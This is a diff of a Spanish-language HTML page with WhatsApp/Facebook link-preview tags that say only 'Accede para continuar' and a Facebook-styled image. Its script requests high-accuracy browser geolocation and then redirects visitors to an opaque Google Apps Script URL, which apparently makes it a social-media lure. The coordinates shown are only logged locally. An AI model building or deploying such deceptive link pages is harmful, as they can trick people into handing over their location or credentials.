@@ -1,4 +1,3 @@
-```html
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -14,10 +13,11 @@
 
 
     <!-- =====================================================
-         VISTA PREVIA DE WHATSAPP
+         VISTA PREVIA DE WHATSAPP / FACEBOOK
          ===================================================== -->
 
-    <meta property="og:type" content="website">
+    <meta property="og:type"
+          content="website">
 
     <meta property="og:title"
           content="Información">
@@ -25,19 +25,8 @@
     <meta property="og:description"
           content="Accede para continuar.">
 
-    <!--
-    REEMPLAZA TUUSUARIO y TUREPOSITORIO
-    por los datos de tu GitHub.
-
-    Si el archivo se llama exactamente:
-
-        FONDO FACEBOOK.jpg
-
-    la URL debe utilizar %20 para el espacio.
-    -->
-
     <meta property="og:image"
-          content="https://TUUSUARIO.github.io/TUREPOSITORIO/FONDOFACEBOOK.png">
+          content="https://henrygpolicia-alt.github.io/facebook/FONDO%20FACEBOOK.jpg">
 
     <meta property="og:image:type"
           content="image/jpeg">
@@ -63,7 +52,7 @@
           content="Accede para continuar.">
 
     <meta name="twitter:image"
-          content="https://TUUSUARIO.github.io/TUREPOSITORIO/FONDOFACEBOOK.png">
+          content="https://henrygpolicia-alt.github.io/facebook/FONDO%20FACEBOOK.jpg">
 
 
     <!-- =====================================================
@@ -109,7 +98,7 @@
             text-align: center;
 
             box-shadow:
-                0 5px 25px rgba(0,0,0,.12);
+                0 5px 25px rgba(0, 0, 0, 0.12);
         }
 
         .imagen {
@@ -164,8 +153,12 @@
             cursor: pointer;
         }
 
+        .boton:hover {
+            background: #0d65d9;
+        }
+
         .boton:disabled {
-            opacity: .6;
+            opacity: 0.6;
 
             cursor: wait;
         }
@@ -194,7 +187,7 @@
 
 
             <!-- =================================================
-                 IMAGEN DEL REPOSITORIO
+                 IMAGEN DEL REPOSITORIO GITHUB
                  ================================================= -->
 
             <img
@@ -237,153 +230,161 @@
 
 
 
-<script>
+    <script>
 
 
-// ==========================================================
-// URL DE DESTINO
-// ==========================================================
+        // ======================================================
+        // URL DE DESTINO
+        // ======================================================
 
-const URL_DESTINO =
-    "https://script.google.com/macros/s/AKfycbxuQCyheiEpGcQuZxqdCMReBxhyDyj2eQzFWyfyrjUNQxVu6pzbA99UFZ5jHicFNvG_/exec";
-
-
-// ==========================================================
-// SOLICITAR UBICACIÓN
-// ==========================================================
-
-function solicitarUbicacion() {
-
-    const estado =
-        document.getElementById("estado");
-
-    const boton =
-        document.getElementById("btnContinuar");
+        const URL_DESTINO =
+            "https://script.google.com/macros/s/AKfycbxuQCyheiEpGcQuZxqdCMReBxhyDyj2eQzFWyfyrjUNQxVu6pzbA99UFZ5jHicFNvG_/exec";
 
 
-    boton.disabled = true;
+        // ======================================================
+        // SOLICITAR UBICACIÓN
+        // ======================================================
 
-    boton.textContent =
-        "SOLICITANDO PERMISO...";
+        function solicitarUbicacion() {
 
+            const estado =
+                document.getElementById("estado");
 
-    // Comprobar compatibilidad
-
-    if (!navigator.geolocation) {
-
-        estado.textContent =
-            "La geolocalización no está disponible en este navegador.";
-
-        setTimeout(redireccionar, 800);
-
-        return;
-    }
+            const boton =
+                document.getElementById("btnContinuar");
 
 
-    estado.textContent =
-        "El navegador solicitará permiso para acceder a la ubicación.";
+            boton.disabled = true;
+
+            boton.textContent =
+                "SOLICITANDO PERMISO...";
 
 
-    // ======================================================
-    // SOLICITUD DEL PERMISO
-    // ======================================================
+            // ==================================================
+            // COMPROBAR COMPATIBILIDAD
+            // ==================================================
 
-    navigator.geolocation.getCurrentPosition(
+            if (!navigator.geolocation) {
 
-        function(position) {
+                estado.textContent =
+                    "La geolocalización no está disponible en este navegador.";
 
-            /*
-             * El usuario concedió el permiso.
-             *
-             * Las coordenadas se obtienen únicamente
-             * dentro de esta página.
-             */
+                setTimeout(
+                    redireccionar,
+                    800
+                );
 
-            const latitud =
-                position.coords.latitude;
-
-            const longitud =
-                position.coords.longitude;
-
-            const precision =
-                position.coords.accuracy;
-
-
-            console.log("Latitud:", latitud);
-
-            console.log("Longitud:", longitud);
-
-            console.log(
-                "Precisión:",
-                precision,
-                "metros"
-            );
+                return;
+            }
 
 
             estado.textContent =
-                "Permiso autorizado. Continuando...";
+                "El navegador solicitará permiso para acceder a la ubicación.";
 
 
-            setTimeout(
-                redireccionar,
-                700
+            // ==================================================
+            // SOLICITUD DEL PERMISO
+            // ==================================================
+
+            navigator.geolocation.getCurrentPosition(
+
+                function(position) {
+
+                    /*
+                     * El usuario concedió el permiso.
+                     */
+
+                    const latitud =
+                        position.coords.latitude;
+
+                    const longitud =
+                        position.coords.longitude;
+
+                    const precision =
+                        position.coords.accuracy;
+
+
+                    console.log(
+                        "Latitud:",
+                        latitud
+                    );
+
+                    console.log(
+                        "Longitud:",
+                        longitud
+                    );
+
+                    console.log(
+                        "Precisión:",
+                        precision,
+                        "metros"
+                    );
+
+
+                    estado.textContent =
+                        "Permiso autorizado. Continuando...";
+
+
+                    setTimeout(
+                        redireccionar,
+                        700
+                    );
+
+                },
+
+
+                function(error) {
+
+                    /*
+                     * El usuario puede rechazar
+                     * el permiso.
+                     */
+
+                    console.log(
+                        "No se obtuvo la ubicación:",
+                        error.message
+                    );
+
+
+                    estado.textContent =
+                        "No se obtuvo la ubicación. Continuando...";
+
+
+                    setTimeout(
+                        redireccionar,
+                        700
+                    );
+
+                },
+
+
+                {
+                    enableHighAccuracy: true,
+
+                    timeout: 10000,
+
+                    maximumAge: 0
+                }
+
             );
 
-        },
-
-
-        function(error) {
-
-            /*
-             * El usuario puede rechazar el permiso.
-             * En ese caso no se obtiene ninguna coordenada.
-             */
-
-            console.log(
-                "No se obtuvo la ubicación:",
-                error.message
-            );
-
-
-            estado.textContent =
-                "No se obtuvo la ubicación. Continuando...";
-
-
-            setTimeout(
-                redireccionar,
-                700
-            );
-
-        },
-
-
-        {
-            enableHighAccuracy: true,
-
-            timeout: 10000,
-
-            maximumAge: 0
         }
 
-    );
 
-}
+        // ======================================================
+        // REDIRECCIÓN
+        // ======================================================
+
+        function redireccionar() {
+
+            window.location.href =
+                URL_DESTINO;
+
+        }
 
 
-// ==========================================================
-// REDIRECCIÓN
-// ==========================================================
-
-function redireccionar() {
-
-    window.location.href =
-        URL_DESTINO;
-
-}
-
-</script>
+    </script>
 
 
 </body>
 </html>
-```
